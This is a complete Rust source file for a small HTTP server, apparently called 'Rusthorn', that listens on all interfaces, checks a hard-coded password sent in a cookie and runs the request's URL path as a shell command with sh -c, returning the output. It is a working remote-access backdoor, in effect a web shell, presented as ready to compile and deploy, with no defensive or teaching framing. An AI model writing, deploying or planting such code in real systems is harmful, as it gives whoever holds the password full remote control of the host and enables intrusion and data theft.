use hyper::{Body, Request, Response, Server, StatusCode};
use hyper::service::{make_service_fn, service_fn};
use std::process::Command;
use tokio::runtime::Runtime;
use std::collections::HashMap;
use hyper::header::COOKIE;

// constants for auth, configs
const PSSWD: &str = "supersecret"; // change this before compile
const PORT: u16 = 11312; // change this before compile

// Function to parse cookies and extract values
fn extract_cookie_value(req: &Request<Body>, key: &str) -> Option<String> {
    if let Some(cookie_header) = req.headers().get(COOKIE) {
        if let Ok(cookie_str) = cookie_header.to_str() {
            let cookies: HashMap<_, _> = cookie_str
                .split(';')
                .map(|s| s.trim())
                .filter_map(|pair| {
                    let mut parts = pair.split('=');
                    Some((parts.next()?.to_string(), parts.next()?.to_string()))
                })
                .collect();
            return cookies.get(key).cloned();
        }
    }
    None
}

async fn handle_request(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
    // extract psswd from cookies
    match extract_cookie_value(&req, "pswd") {
        Some(ref p) if p == PSSWD => {} // matches, continue
        _ => {
            return Ok(Response::builder()
                .status(StatusCode::UNAUTHORIZED)
                .body(Body::from("Unauthorized: Missing or incorrect password"))
                .unwrap());
        }
    }

    // get command from URL path
    let command = req.uri().path().trim_start_matches('/');

    if command.is_empty() {
        return Ok(Response::new(Body::from("No command specified.")));
    }

    println!("Executing command: {}", command);

    let output = Command::new("sh")
        .arg("-c")
        .arg(command)
        .output();

    match output {
        Ok(output) => {
            let result = if !output.stdout.is_empty() {
                String::from_utf8_lossy(&output.stdout).to_string()
            } else {
                String::from_utf8_lossy(&output.stderr).to_string()
            };
            Ok(Response::new(Body::from(result)))
        },
        Err(e) => {
            let error_message = format!("Failed to execute command: {}", e);
            Ok(Response::new(Body::from(error_message)))
        }
    }
}

async fn run_server() {
    let make_svc = make_service_fn(|_conn| async {
        Ok::<_, hyper::Error>(service_fn(handle_request))
    });

    let addr = ([0, 0, 0, 0], PORT).into();
    let server = Server::bind(&addr).serve(make_svc);

    println!("Rusthorn server running on http://0.0.0.0:{}", PORT);

    if let Err(e) = server.await {
        eprintln!("Server error: {}", e);
    }
}

fn main() {
    let rt = Runtime::new().unwrap();
    rt.block_on(run_server());
}
